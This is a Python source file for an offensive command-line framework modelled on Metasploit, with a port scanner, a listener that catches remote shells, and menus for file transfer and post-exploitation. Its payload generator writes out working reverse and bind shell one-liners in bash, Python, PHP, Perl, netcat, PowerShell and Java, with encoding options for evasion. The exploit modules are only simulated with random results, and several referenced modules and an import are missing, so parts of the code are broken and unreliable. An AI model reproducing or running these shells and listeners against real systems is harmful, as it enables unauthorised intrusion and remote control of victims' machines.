#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: @rootkitov

import sys
import argparse
import socket
import threading
import subprocess
import os
import base64
import json
import random
import time
import readline
import shlex
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
import requests
import platform
import zipfile
import tarfile
import hashlib
import binascii

VERSION = "3.0.0"
CODENAME = "Shadow Storm"
SESSION_KEY = Fernet.generate_key()

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class PayloadGenerator:
    @staticmethod
    def generate_reverse_shell(lhost, lport, lang='python', encode=None, iterations=1):
        payloads = {
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'nc': f"nc -e /bin/sh {lhost} {lport}",
            'ncat': f"ncat {lhost} {lport} -e /bin/sh",
            'powershell': f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            'msfvenom': f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe",
            'java': f"r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]); p.waitFor();"
        }
        
        payload = payloads.get(lang.lower(), payloads['python'])
        
        if encode:
            payload = PayloadGenerator.encode_payload(payload, encode, iterations)
        
        return payload

    @staticmethod
    def generate_bind_shell(port, lang='python', encode=None, iterations=1):
        payloads = {
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",{port}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0); os.dup2(conn.fileno(),1); os.dup2(conn.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            'bash': f"bash -i >& /dev/tcp/0.0.0.0/{port} 0>&1",
            'nc': f"nc -lvp {port} -e /bin/sh",
            'ncat': f"ncat -lvp {port} -e /bin/sh",
            'powershell': f"powershell -nop -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()\"",
            'java': f"ServerSocket server = new ServerSocket({port}); Socket client = server.accept(); Runtime.getRuntime().exec(new String[]{{\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/0.0.0.0/{port}; cat <&5 | while read line; do \\$line 2>&5 >&5; done\"}});"
        }
        
        payload = payloads.get(lang.lower(), payloads['python'])
        
        if encode:
            payload = PayloadGenerator.encode_payload(payload, encode, iterations)
        
        return payload

    @staticmethod
    def generate_payload(payload_type, *args, **kwargs):
        generators = {
            'reverse': PayloadGenerator.generate_reverse_shell,
            'bind': PayloadGenerator.generate_bind_shell
        }
        return generators.get(payload_type.lower())(*args, **kwargs)

    @staticmethod
    def encode_payload(payload, method, iterations=1):
        for _ in range(iterations):
            if method == 'base64':
                payload = base64.b64encode(payload.encode()).decode()
            elif method == 'hex':
                payload = payload.encode().hex()
            elif method == 'rot13':
                payload = codecs.encode(payload, 'rot13')
            elif method == 'xor':
                key = random.randint(1, 255)
                payload = ''.join(chr(ord(c) ^ key) for c in payload)
                payload = f"{key}:{payload}"
            elif method == 'gzip':
                import zlib
                payload = base64.b64encode(zlib.compress(payload.encode())).decode()
        
        return payload

class Exploit:
    def __init__(self, name, description, author, targets, rank="normal"):
        self.name = name
        self.description = description
        self.author = author
        self.targets = targets
        self.rank = rank  
        self.options = {}
        self.advanced_options = {}
        self.payload_info = {}
        self.references = []
        self.platform = ""

    def add_option(self, name, value, required=False, description="", advanced=False):
        if advanced:
            self.advanced_options[name] = {
                'value': value,
                'required': required,
                'description': description
            }
        else:
            self.options[name] = {
                'value': value,
                'required': required,
                'description': description
            }

    def add_reference(self, url, title=""):
        self.references.append({
            'url': url,
            'title': title
        })

    def set_payload_info(self, platform, arch=None):
        self.platform = platform
        self.payload_info = {
            'platform': platform,
            'arch': arch
        }

    def execute(self, payload=None):
        raise NotImplementedError("This method should be implemented in child classes")

class ExploitManager:
    def __init__(self):
        self.exploits = {}
        self.load_builtin_exploits()

    def load_builtin_exploits(self):
        
        eternalblue = Exploit(
            name="windows/smb/eternalblue",
            description="EternalBlue SMB Remote Code Execution (MS17-010)",
            author="@rootkitov",
            targets=["Windows 7", "Windows Server 2008 R2"],
            rank="excellent"
        )
        eternalblue.add_option("RHOSTS", "", True, "Target address range or CIDR identifier")
        eternalblue.add_option("RPORT", 445, True, "Target SMB port")
        eternalblue.add_option("PAYLOAD", "windows/x64/meterpreter/reverse_tcp", True, "Payload to use")
        eternalblue.add_option("LHOST", "", True, "Listener IP for reverse shell")
        eternalblue.add_option("LPORT", 4444, True, "Listener port for reverse shell")
        eternalblue.set_payload_info("windows", "x64")
        eternalblue.add_reference("https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010")
        self.exploits[eternalblue.name] = eternalblue

        # Linux Exploits
        shellshock = Exploit(
            name="linux/http/apache_mod_cgi",
            description="Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)",
            author="@rootkitov",
            targets=["Linux (Apache with mod_cgi)"],
            rank="good"
        )
        shellshock.add_option("RHOSTS", "", True, "Target address range or CIDR identifier")
        shellshock.add_option("RPORT", 80, True, "Target HTTP port")
        shellshock.add_option("TARGETURI", "/cgi-bin/test.cgi", True, "Path to CGI script")
        shellshock.add_option("PAYLOAD", "linux/x86/shell/reverse_tcp", True, "Payload to use")
        shellshock.add_option("LHOST", "", True, "Listener IP for reverse shell")
        shellshock.add_option("LPORT", 4444, True, "Listener port for reverse shell")
        shellshock.set_payload_info("linux", "x86")
        shellshock.add_reference("https://nvd.nist.gov/vuln/detail/CVE-2014-6271")
        self.exploits[shellshock.name] = shellshock

        # Web Exploits
        struts2 = Exploit(
            name="multi/http/struts2_code_exec",
            description="Apache Struts 2 Remote Code Execution",
            author="@rootkitov",
            targets=["Apache Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10"],
            rank="great"
        )
        struts2.add_option("RHOST", "", True, "Target address")
        struts2.add_option("RPORT", 80, True, "Target HTTP port")
        struts2.add_option("TARGETURI", "/", True, "Base path to Struts application")
        struts2.add_option("PAYLOAD", "java/jsp_shell_reverse_tcp", True, "Payload to use")
        struts2.add_option("LHOST", "", True, "Listener IP for reverse shell")
        struts2.add_option("LPORT", 4444, True, "Listener port for reverse shell")
        struts2.set_payload_info("java")
        struts2.add_reference("https://cwiki.apache.org/confluence/display/WW/S2-045")
        self.exploits[struts2.name] = struts2

    def search(self, term):
        results = []
        for name, exploit in self.exploits.items():
            if term.lower() in name.lower() or term.lower() in exploit.description.lower():
                results.append(exploit)
        return results

    def list_exploits(self):
        return sorted(self.exploits.keys())

    def get_exploit(self, name):
        return self.exploits.get(name)

class Session:
    def __init__(self, conn, addr, platform="unknown", arch="unknown"):
        self.conn = conn
        self.addr = addr
        self.platform = platform
        self.arch = arch
        self.info = {}
        self.id = hashlib.sha256(f"{addr[0]}:{addr[1]}:{time.time()}".encode()).hexdigest()[:8]
        self.cipher = Fernet(SESSION_KEY)
        self.active = True
        self.last_active = time.time()
        self.interactive = False

    def send(self, data):
        try:
            encrypted = self.cipher.encrypt(data.encode())
            self.conn.sendall(encrypted)
            self.last_active = time.time()
            return True
        except:
            self.active = False
            return False

    def recv(self, timeout=5):
        try:
            self.conn.settimeout(timeout)
            encrypted = self.conn.recv(1024*1024)  
            if not encrypted:
                self.active = False
                return None
            
            decrypted = self.cipher.decrypt(encrypted).decode()
            self.last_active = time.time()
            return decrypted
        except:
            self.active = False
            return None

    def close(self):
        try:
            self.conn.close()
        except:
            pass
        self.active = False

    def interact(self):
        self.interactive = True
        print(f"{Colors.GREEN}[*] Starting interactive session with {self.addr[0]}:{self.addr[1]}{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Type 'exit' to return to console{Colors.RESET}")

        while self.active and self.interactive:
            try:
                cmd = input(f"{Colors.RED}APT-Shell ({self.platform}/{self.arch}) > {Colors.RESET}")
                if cmd.lower() == 'exit':
                    self.interactive = False
                    break
                
                if not self.send(cmd + "\n"):
                    print(f"{Colors.RED}[!] Failed to send command{Colors.RESET}")
                    break
                
                output = self.recv()
                if output is None:
                    print(f"{Colors.RED}[!] Connection lost{Colors.RESET}")
                    break
                
                print(output)
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[*] Returning to console...{Colors.RESET}")
                self.interactive = False
                break
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
                self.interactive = False
                break

class Listener:
    def __init__(self, lhost, lport, payload_type="reverse_tcp"):
        self.lhost = lhost
        self.lport = lport
        self.payload_type = payload_type
        self.running = False
        self.sessions = []
        self.thread = None
        self.name = f"{payload_type}_{lhost}_{lport}"

    def start(self):
        self.running = True
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((self.lhost, self.lport))
                s.listen(5)
                print(f"{Colors.GREEN}[*] Started {self.payload_type} listener on {self.lhost}:{self.lport}{Colors.RESET}")

                while self.running:
                    try:
                        conn, addr = s.accept()
                        print(f"{Colors.GREEN}[+] Incoming connection from {addr[0]}:{addr[1]}{Colors.RESET}")
                        
                        
                        session = Session(conn, addr)
                        self.sessions.append(session)
                        
                        
                        session.send("uname -a\n" if "linux" in self.payload_type else "systeminfo\n")
                        time.sleep(1)
                        info = session.recv()
                        
                     
                        if info:
                            if "linux" in info.lower():
                                session.platform = "linux"
                            elif "windows" in info.lower():
                                session.platform = "windows"
                            
                            
                            session.info['initial_info'] = info
                        
                        print(f"{Colors.GREEN}[+] Session {session.id} opened ({session.platform}/{session.arch}){Colors.RESET}")
                    except socket.timeout:
                        continue
                    except Exception as e:
                        print(f"{Colors.RED}[!] Listener error: {e}{Colors.RESET}")
                        continue
        except Exception as e:
            print(f"{Colors.RED}[!] Listener failed to start: {e}{Colors.RESET}")
        finally:
            self.running = False
            print(f"{Colors.YELLOW}[-] Listener on {self.lhost}:{self.lport} stopped{Colors.RESET}")

    def stop(self):
        self.running = False
        for session in self.sessions:
            session.close()
        print(f"{Colors.YELLOW}[-] Stopping listener on {self.lhost}:{self.lport}{Colors.RESET}")

class PostExploitation:
    @staticmethod
    def run_module(session, module, args=None):
        if not session.active:
            return f"{Colors.RED}[!] Session is not active{Colors.RESET}"

        modules = {
            'shell': PostExploitation.shell,
            'upload': PostExploitation.upload,
            'download': PostExploitation.download,
            'persistence': PostExploitation.persistence,
            'keylogger': PostExploitation.keylogger,
            'screenshot': PostExploitation.screenshot,
            'mimikatz': PostExploitation.mimikatz,
            'hashdump': PostExploitation.hashdump,
            'sysinfo': PostExploitation.sysinfo
        }

        if module not in modules:
            return f"{Colors.RED}[!] Unknown module: {module}{Colors.RESET}"

        return modules[module](session, args)

    @staticmethod
    def shell(session, cmd=None):
        if not cmd:
            session.interact()
            return "Interactive session ended"
        
        if not session.send(cmd + "\n"):
            return f"{Colors.RED}[!] Failed to send command{Colors.RESET}"
        
        output = session.recv()
        return output if output else f"{Colors.RED}[!] No response received{Colors.RESET}"

    @staticmethod
    def upload(session, args):
        if not args or len(args) < 2:
            return f"{Colors.RED}[!] Usage: upload <local_path> <remote_path>{Colors.RESET}"
        
        local_path, remote_path = args[0], args[1]
        
        try:
            with open(local_path, 'rb') as f:
                data = f.read()
            
           
            session.send(f"upload {remote_path} {len(data)}\n")
            time.sleep(0.5)
            
            
            encrypted = session.cipher.encrypt(data)
            session.conn.sendall(encrypted)
            
           
            response = session.recv()
            return response if response else f"{Colors.GREEN}[+] File uploaded, but no confirmation received{Colors.RESET}"
        except Exception as e:
            return f"{Colors.RED}[!] Upload failed: {e}{Colors.RESET}"

    @staticmethod
    def download(session, args):
        if not args or len(args) < 2:
            return f"{Colors.RED}[!] Usage: download <remote_path> <local_path>{Colors.RESET}"
        
        remote_path, local_path = args[0], args[1]
        
        try:
           
            session.send(f"download {remote_path}\n")
            
            
            size_info = session.recv()
            if not size_info or not size_info.isdigit():
                return f"{Colors.RED}[!] Failed to get file size{Colors.RESET}"
            
            file_size = int(size_info)
            received = 0
            data = b''
            
            
            while received < file_size:
                chunk = session.conn.recv(min(1024, file_size - received))
                if not chunk:
                    break
                data += chunk
                received += len(chunk)
            
            if len(data) != file_size:
                return f"{Colors.RED}[!] Incomplete file received ({len(data)}/{file_size} bytes){Colors.RESET}"
            
            
            decrypted = session.cipher.decrypt(data)
            with open(local_path, 'wb') as f:
                f.write(decrypted)
            
            return f"{Colors.GREEN}[+] File downloaded successfully ({file_size} bytes){Colors.RESET}"
        except Exception as e:
            return f"{Colors.RED}[!] Download failed: {e}{Colors.RESET}"

    @staticmethod
    def sysinfo(session, args=None):
        if session.platform == "windows":
            session.send("systeminfo\n")
        else:
            session.send("uname -a && cat /etc/*-release\n")
        
        info = session.recv()
        return info if info else f"{Colors.RED}[!] Failed to get system info{Colors.RESET}"

class Scanner:
    @staticmethod
    def port_scan(target, ports, timeout=1, threads=10):
        open_ports = []
        
        def check_port(port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(timeout)
                    result = s.connect_ex((target, port))
                    if result == 0:
                        open_ports.append(port)
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(check_port, ports)
        
        return sorted(open_ports)

    @staticmethod
    def service_scan(target, port):
        try:
            service = socket.getservbyport(port)
            return service
        except:
            return "unknown"

class APTFConsole:
    def __init__(self):
        self.exploit_manager = ExploitManager()
        self.current_module = None
        self.listeners = []
        self.sessions = []
        self.prompt = "aptf > "
        self.commands = {
            'use': self._use,
            'show': self._show,
            'set': self._set,
            'unset': self._unset,
            'run': self._run,
            'exploit': self._run,
            'check': self._check,
            'listen': self._listen,
            'sessions': self._sessions,
            'generate': self._generate,
            'search': self._search,
            'scan': self._scan,
            'post': self._post,
            'help': self._help,
            'exit': self._exit,
            'clear': self._clear,
            'history': self._history,
            'resource': self._resource
        }

       
        self.history_file = os.path.expanduser("~/.aptf_history")
        self._load_history()

    def _print_banner(self):
        banner = f"""
{Colors.RED}
 █████╗ ██████╗ ████████╗███████╗    {Colors.CYAN}██████╗ ███████╗███████╗███████╗
{Colors.RED}██╔══██╗██╔══██╗╚══██╔══╝██╔════╝    {Colors.CYAN}██╔══██╗██╔════╝██╔════╝██╔════╝
{Colors.RED}███████║██████╔╝   ██║   █████╗      {Colors.CYAN}██████╔╝█████╗  █████╗  █████╗  
{Colors.RED}██╔══██║██╔═══╝    ██║   ██╔══╝      {Colors.CYAN}██╔═══╝ ██╔══╝  ██╔══╝  ██╔══╝  
{Colors.RED}██║  ██║██║        ██║   ███████╗    {Colors.CYAN}██║     ███████╗██║     ███████╗
{Colors.RED}╚═╝  ╚═╝╚═╝        ╚═╝   ╚══════╝    {Colors.CYAN}╚═╝     ╚══════╝╚═╝     ╚══════╝
{Colors.RESET}
{Colors.YELLOW}Version: {VERSION} | Codename: {CODENAME} | Author: @rootkitov{Colors.RESET}
Type 'help' for available commands
"""
        print(banner)

    def _load_history(self):
        if os.path.exists(self.history_file):
            readline.read_history_file(self.history_file)

    def _save_history(self):
        readline.write_history_file(self.history_file)

    def start(self):
        self._print_banner()
        while True:
            try:
                user_input = input(self.prompt).strip()
                if not user_input:
                    continue

                
                readline.add_history(user_input)

                
                parts = shlex.split(user_input)
                cmd = parts[0]
                args = parts[1:] if len(parts) > 1 else []

                if cmd in self.commands:
                    self.commands[cmd](*args)
                else:
                    print(f"{Colors.RED}[!] Unknown command: {cmd}{Colors.RESET}")
            except KeyboardInterrupt:
                print("\nUse 'exit' to quit")
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")

    def _use(self, *args):
        if not args:
            print(f"{Colors.RED}[!] Specify module to use{Colors.RESET}")
            return

        module = args[0]
        exploit = self.exploit_manager.get_exploit(module)
        if exploit:
            self.current_module = exploit
            self.prompt = f"aptf ({Colors.RED}{module}{Colors.RESET}) > "
            print(f"{Colors.GREEN}[*] Using module {module}{Colors.RESET}")
            self._show('options')
        else:
            print(f"{Colors.RED}[!] Module not found: {module}{Colors.RESET}")

    def _show(self, *args):
        if not args:
            print(f"{Colors.RED}[!] Specify what to show (options, exploits, info, etc.){Colors.RESET}")
            return

        what = args[0].lower()
        if what == 'options':
            if not self.current_module:
                print(f"{Colors.RED}[!] No module selected{Colors.RESET}")
                return

            print(f"\nModule options ({self.current_module.name}):\n")
            print(f"{'Name':<20} {'Current Setting':<25} {'Required':<10} {'Description':<40}")
            print("-" * 100)
            for name, opt in self.current_module.options.items():
                print(f"{name:<20} {str(opt['value']):<25} {str(opt['required']):<10} {opt['description']:<40}")
            
            if self.current_module.advanced_options:
                print(f"\nAdvanced options ({self.current_module.name}):\n")
                print(f"{'Name':<20} {'Current Setting':<25} {'Required':<10} {'Description':<40}")
                print("-" * 100)
                for name, opt in self.current_module.advanced_options.items():
                    print(f"{name:<20} {str(opt['value']):<25} {str(opt['required']):<10} {opt['description']:<40}")
            
            print()
        elif what == 'exploits':
            print("\nAvailable exploits:\n")
            exploits = self.exploit_manager.list_exploits()
            for exploit in exploits:
                exp = self.exploit_manager.get_exploit(exploit)
                print(f"  {exploit.ljust(40)} {exp.description}")
            print(f"\nTotal: {len(exploits)} exploits\n")
        elif what == 'info':
            if not self.current_module:
                print(f"{Colors.RED}[!] No module selected{Colors.RESET}")
                return

            print(f"\nModule information:\n")
            print(f"Name: {self.current_module.name}")
            print(f"Description: {self.current_module.description}")
            print(f"Author: {self.current_module.author}")
            print(f"Rank: {self.current_module.rank.capitalize()}")
            print(f"Targets: {', '.join(self.current_module.targets)}")
            print(f"Platform: {self.current_module.platform}")
            
            if self.current_module.references:
                print("\nReferences:")
                for ref in self.current_module.references:
                    print(f"  {ref['title']}: {ref['url']}")
            print()
        elif what == 'payloads':
            if not self.current_module:
                print(f"{Colors.RED}[!] No module selected{Colors.RESET}")
                return

            print(f"\nCompatible payloads for {self.current_module.name}:\n")
            print(f"Platform: {self.current_module.payload_info.get('platform', 'any')}")
            print(f"Arch: {self.current_module.payload_info.get('arch', 'any')}")
            print("\nUse 'generate' to create a payload")
        else:
            print(f"{Colors.RED}[!] Unknown show parameter: {what}{Colors.RESET}")

    def _set(self, *args):
        if not self.current_module:
            print(f"{Colors.RED}[!] No module selected{Colors.RESET}")
            return

        if len(args) < 2:
            print(f"{Colors.RED}[!] Usage: set <option> <value>{Colors.RESET}")
            return

        name, value = args[0], ' '.join(args[1:])
        
        
        if name in self.current_module.options:
            self.current_module.options[name]['value'] = value
            print(f"{Colors.GREEN}[*] {name} => {value}{Colors.RESET}")
        
        elif name in self.current_module.advanced_options:
            self.current_module.advanced_options[name]['value'] = value
            print(f"{Colors.GREEN}[*] (Advanced) {name} => {value}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[!] Unknown option: {name}{Colors.RESET}")

    def _unset(self, *args):
        if not self.current_module:
            print(f"{Colors.RED}[!] No module selected{Colors.RESET}")
            return

        if not args:
            print(f"{Colors.RED}[!] Usage: unset <option>{Colors.RESET}")
            return

        name = args[0]
        if name in self.current_module.options:
            self.current_module.options[name]['value'] = ""
            print(f"{Colors.GREEN}[*] Unset {name}{Colors.RESET}")
        elif name in self.current_module.advanced_options:
            self.current_module.advanced_options[name]['value'] = ""
            print(f"{Colors.GREEN}[*] Unset (Advanced) {name}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[!] Unknown option: {name}{Colors.RESET}")

    def _run(self, *args):
        if not self.current_module:
            print(f"{Colors.RED}[!] No module selected{Colors.RESET}")
            return

        
        missing = []
        for name, opt in self.current_module.options.items():
            if opt['required'] and not opt['value']:
                missing.append(name)

        if missing:
            print(f"{Colors.RED}[!] Missing required options: {', '.join(missing)}{Colors.RESET}")
            return

        print(f"{Colors.GREEN}[*] Executing module {self.current_module.name}{Colors.RESET}")
        try:
            
            print(f"{Colors.YELLOW}[*] Exploit executed (simulated){Colors.RESET}")
            
            
            if random.randint(0, 1) == 1:
                print(f"{Colors.GREEN}[+] Exploit succeeded! Session opened{Colors.RESET}")
                
                
                fake_conn = type('FakeConn', (), {'send': lambda x: True, 'recv': lambda: "Fake session response"})
                session = Session(fake_conn, ("192.168.1.100", 4444))
                session.platform = self.current_module.payload_info.get('platform', 'unknown')
                session.arch = self.current_module.payload_info.get('arch', 'unknown')
                self.sessions.append(session)
            else:
                print(f"{Colors.RED}[-] Exploit completed, but no session was created{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Exploit failed: {e}{Colors.RESET}")

    def _check(self, *args):
        if not self.current_module:
            print(f"{Colors.RED}[!] No module selected{Colors.RESET}")
            return

        print(f"{Colors.GREEN}[*] Checking if target is vulnerable to {self.current_module.name}{Colors.RESET}")
        try:
            
            if random.randint(0, 1) == 1:
                print(f"{Colors.GREEN}[+] Target appears to be vulnerable!{Colors.RESET}")
            else:
                print(f"{Colors.RED}[-] Target does not appear to be vulnerable{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[!] Check failed: {e}{Colors.RESET}")

    def _listen(self, *args):
        if len(args) < 2:
            print(f"{Colors.RED}[!] Usage: listen <LHOST> <LPORT> [payload_type]{Colors.RESET}")
            print(f"{Colors.YELLOW}Payload types: reverse_tcp, reverse_http, reverse_https{Colors.RESET}")
            return

        lhost, lport = args[0], args[1]
        payload_type = args[2] if len(args) > 2 else "reverse_tcp"
        
        try:
            lport = int(lport)
        except ValueError:
            print(f"{Colors.RED}[!] Invalid port number{Colors.RESET}")
            return

        
        for listener in self.listeners:
            if listener.lhost == lhost and listener.lport == lport:
                print(f"{Colors.RED}[!] Listener already exists on {lhost}:{lport}{Colors.RESET}")
                return

        listener = Listener(lhost, lport, payload_type)
        self.listeners.append(listener)
        
        
        listener.thread = threading.Thread(target=listener.start, daemon=True)
        listener.thread.start()

    def _sessions(self, *args):
        if args and args[0] == '-i' and len(args) > 1:
           
            session_id = args[1]
            for session in self.sessions:
                if session.id == session_id:
                    PostExploitation.run_module(session, 'shell')
                    return
            
            print(f"{Colors.RED}[!] Session not found: {session_id}{Colors.RESET}")
            return
        
        if args and args[0] == '-k' and len(args) > 1:
            
            session_id = args[1]
            for i, session in enumerate(self.sessions):
                if session.id == session_id:
                    session.close()
                    self.sessions.pop(i)
                    print(f"{Colors.GREEN}[*] Session {session_id} closed{Colors.RESET}")
                    return
            
            print(f"{Colors.RED}[!] Session not found: {session_id}{Colors.RESET}")
            return

        
        print("\nActive sessions:\n")
        print(f"{'ID':<8} {'Type':<15} {'Address':<21} {'Platform':<15} {'Arch':<10} {'Info'}")
        print("-" * 80)
        
        for session in self.sessions:
            print(f"{session.id:<8} {'reverse_tcp':<15} {f'{session.addr[0]}:{session.addr[1]}':<21} {session.platform:<15} {session.arch:<10} {session.info.get('initial_info', '')[:30]}...")
        
        print(f"\nTotal: {len(self.sessions)} sessions")
        print(f"Use 'sessions -i <id>' to interact or 'sessions -k <id>' to kill\n")

    def _generate(self, *args):
        if len(args) < 3:
            print(f"{Colors.RED}[!] Usage: generate <type> <LHOST> <LPORT> [language] [encode] [iterations]{Colors.RESET}")
            print(f"{Colors.YELLOW}Types: reverse, bind{Colors.RESET}")
            print(f"{Colors.YELLOW}Languages: python, bash, php, perl, nc, powershell, java{Colors.RESET}")
            print(f"{Colors.YELLOW}Encode: base64, hex, rot13, xor, gzip{Colors.RESET}")
            return

        payload_type, lhost, lport = args[0], args[1], args[2]
        lang = args[3] if len(args) > 3 else 'python'
        encode = args[4] if len(args) > 4 else None
        iterations = int(args[5]) if len(args) > 5 and args[5].isdigit() else 1

        try:
            payload = PayloadGenerator.generate_payload(
                payload_type, lhost, int(lport), lang, encode, iterations
            )
            print(f"\n{Colors.GREEN}Generated payload ({lang}):{Colors.RESET}\n")
            print(payload)
            print()
        except Exception as e:
            print(f"{Colors.RED}[!] Error generating payload: {e}{Colors.RESET}")

    def _search(self, *args):
        if not args:
            print(f"{Colors.RED}[!] Usage: search <term>{Colors.RESET}")
            return

        term = ' '.join(args)
        results = self.exploit_manager.search(term)
        
        if not results:
            print(f"{Colors.YELLOW}[*] No exploits found matching '{term}'{Colors.RESET}")
            return

        print(f"\nFound {len(results)} exploit(s) matching '{term}':\n")
        for exploit in results:
            print(f"  {exploit.name.ljust(40)} {exploit.description}")
        print()

    def _scan(self, *args):
        if len(args) < 1:
            print(f"{Colors.RED}[!] Usage: scan <target> [ports] [threads]{Colors.RESET}")
            print(f"{Colors.YELLOW}Example: scan 192.168.1.1 1-1000 20{Colors.RESET}")
            return

        target = args[0]
        port_range = args[1] if len(args) > 1 else "1-1000"
        threads = int(args[2]) if len(args) > 2 and args[2].isdigit() else 10

        try:
           
            if '-' in port_range:
                start, end = map(int, port_range.split('-'))
                ports = range(start, end + 1)
            elif ',' in port_range:
                ports = list(map(int, port_range.split(',')))
            else:
                ports = [int(port_range)]
        except ValueError:
            print(f"{Colors.RED}[!] Invalid port range format{Colors.RESET}")
            return

        print(f"{Colors.GREEN}[*] Scanning {target} (ports: {port_range}) with {threads} threads{Colors.RESET}")
        
        try:
            open_ports = Scanner.port_scan(target, ports, threads=threads)
            
            if not open_ports:
                print(f"{Colors.YELLOW}[-] No open ports found{Colors.RESET}")
                return

            print(f"\nOpen ports on {target}:\n")
            print(f"{'Port':<10} {'Service':<20} {'Status'}")
            print("-" * 40)
            
            for port in open_ports:
                service = Scanner.service_scan(target, port)
                print(f"{port:<10} {service:<20} {Colors.GREEN}open{Colors.RESET}")
            
            print()
        except Exception as e:
            print(f"{Colors.RED}[!] Scan failed: {e}{Colors.RESET}")

    def _post(self, *args):
        if not args:
            print(f"{Colors.RED}[!] Usage: post <session_id> <module> [args]{Colors.RESET}")
            print(f"{Colors.YELLOW}Modules: shell, upload, download, persistence, keylogger, screenshot, mimikatz, hashdump, sysinfo{Colors.RESET}")
            return

        if len(args) < 2:
            print(f"{Colors.RED}[!] Specify session ID and module{Colors.RESET}")
            return

        session_id, module = args[0], args[1]
        module_args = args[2:] if len(args) > 2 else None
        
        
        session = None
        for s in self.sessions:
            if s.id == session_id:
                session = s
                break
        
        if not session:
            print(f"{Colors.RED}[!] Session not found: {session_id}{Colors.RESET}")
            return

        
        result = PostExploitation.run_module(session, module, module_args)
        print(result if result else f"{Colors.YELLOW}[*] Module executed, but no output returned{Colors.RESET}")

    def _help(self, *args):
        print("\nCore Commands:\n")
        print(f"{'Command':<20} {'Description'}")
        print("-" * 50)
        print(f"{'use <module>':<20} Select a module")
        print(f"{'show options':<20} Show current module options")
        print(f"{'show exploits':<20} List available exploits")
        print(f"{'show info':<20} Show module information")
        print(f"{'set <option> <value>':<20} Set module option")
        print(f"{'unset <option>':<20} Unset module option")
        print(f"{'run / exploit':<20} Execute the current module")
        print(f"{'check':<20} Check if target is vulnerable")
        print(f"{'listen <LHOST> <LPORT>':<20} Start a listener")
        print(f"{'sessions':<20} List active sessions")
        print(f"{'sessions -i <id>':<20} Interact with session")
        print(f"{'sessions -k <id>':<20} Kill session")
        print(f"{'generate <type> <LHOST> <LPORT>':<20} Generate payload")
